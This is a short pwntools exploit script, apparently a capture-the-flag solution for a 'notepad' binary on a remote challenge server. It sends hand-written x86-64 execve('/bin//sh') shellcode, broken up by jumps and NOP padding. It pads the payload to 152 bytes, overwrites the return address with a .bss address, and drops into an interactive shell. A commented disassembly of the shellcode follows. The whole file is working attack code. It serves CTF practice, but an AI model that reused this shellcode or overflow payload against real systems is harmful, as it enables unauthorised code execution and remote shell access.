from pwn import *

# r = process("./notepad")
# r = gdb.debug("./notepad", "b main")
r = remote("ctf.adl.tw", 11003)

shellcode = '\x48\x31\xC0\x50\xB8\x2F\x2F\x73\x68\xEB\x05\x90\x90\x90\x90\x90\x48\xC1\xE0\x20\x90\x90\x90\x90\x90\xEB\x05\x90\x90\x90\x90\x90\x48\x05\x2F\x62\x69\x6E\x50\x90\x90\xEB\x05\x90\x90\x90\x90\x90\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xEB\x05\x90\x90\x90\x90\x90\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05'
bss = 0x6010c0

print len(shellcode)
r.recv()
payload = shellcode + '\x90'*(152-len(shellcode)) + p64(bss)
r.sendline(payload)

r.interactive()

'''
0:  48 31 c0                xor    rax,rax
3:  50                      push   rax
4:  b8 2f 2f 73 68          mov    eax,0x68732f2f
jmp 0x05

9:  48 c1 e0 20             shl    rax,0x20
NOP
NOP
NOP
NOP
NOP
NOP
jmp 0x05

d:  48 05 2f 62 69 6e       add    rax,0x6e69622f
13: 50                      push   rax
NOP
NOP
jmp 0x05

14: 48 89 e7                mov    rdi,rsp
17: 48 31 f6                xor    rsi,rsi
1a: 48 31 d2                xor    rdx,rdx
jmp 0x05

1d: 48 c7 c0 3b 00 00 00    mov    rax,0x3b
24: 0f 05                   syscall 
'''
